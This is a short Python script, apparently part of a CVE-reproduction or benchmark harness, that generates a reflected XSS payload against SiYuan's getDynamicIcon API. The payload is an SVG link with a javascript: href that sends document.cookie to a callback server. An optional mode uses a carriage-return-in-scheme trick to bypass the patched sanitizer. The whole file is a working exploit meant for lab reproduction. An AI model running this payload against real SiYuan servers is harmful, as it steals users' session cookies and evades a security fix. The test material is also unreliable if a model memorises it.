#!/usr/bin/env python3
"""CVE-2026-29183 seed for siyuan-cve-2026-31809.

Reflected <a href="javascript:..."> in GET /api/icon/getDynamicIcon?type=8.
V0 (3.5.8, RemoveScriptsInSVG) keeps the href; V1 (3.5.9, SanitizeSVG) strips
static javascript: hrefs. Residual is inlined in verify.sh else
(CVE-2026-31809 CR-in-scheme java&#13;script:); --residual is kept here too.
"""
import json
import sys
import urllib.parse

CB = "http://callback:9000/c?f="


def candidate(*, base=None, mode="seed"):
    if base is None:
        v = sys.argv[1] if len(sys.argv) > 1 else "v1"
        base = {"v0": "http://v0:6806", "v1": "http://v1:6806", "v2": "http://v2:6806"}.get(v, "http://v1:6806")
    scheme = "java&#13;script" if mode == "residual" else "javascript"
    payload = (
        '</text><a href="' + scheme + ":location='"
        + CB
        + "'+document.cookie\"><text x=\"256\" y=\"256\" font-size=\"60\">c</text></a><text>"
    )
    return {
        "target": base + "/api/icon/getDynamicIcon?type=8&color=blue&content=" + urllib.parse.quote(payload, safe=""),
        "origin": base,
    }


if __name__ == "__main__":
    mode = "residual" if "--residual" in sys.argv else "seed"
    print(json.dumps(candidate(mode=mode), indent=2))
